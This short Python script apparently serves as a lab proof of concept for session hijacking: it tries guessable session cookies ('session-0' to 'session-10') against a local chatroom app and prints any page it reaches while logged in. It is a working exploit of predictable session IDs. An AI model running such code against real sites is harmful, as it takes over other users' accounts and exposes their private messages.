import sys
import requests
import json
import bs4 as bs

def isloggedin(response):
    soup = bs.BeautifulSoup(response.text, 'html.parser')
    return soup.title.text.startswith('Chatroom')

def test_session(address):  
    session = requests.Session()    
    for i in range(11):
        session.cookies.set("sessionid", "session-"+str(i), domain="127.0.0.1")
        res = session.get(address)
        if res.status_code == 200 and isloggedin(res):
            print(f"Page fetched successfully with session id {i}!")
            print(res.text)
        else:
            print(f"Failed to fetch page wih id {i}")
    


test_session("http://127.0.0.1:8000/")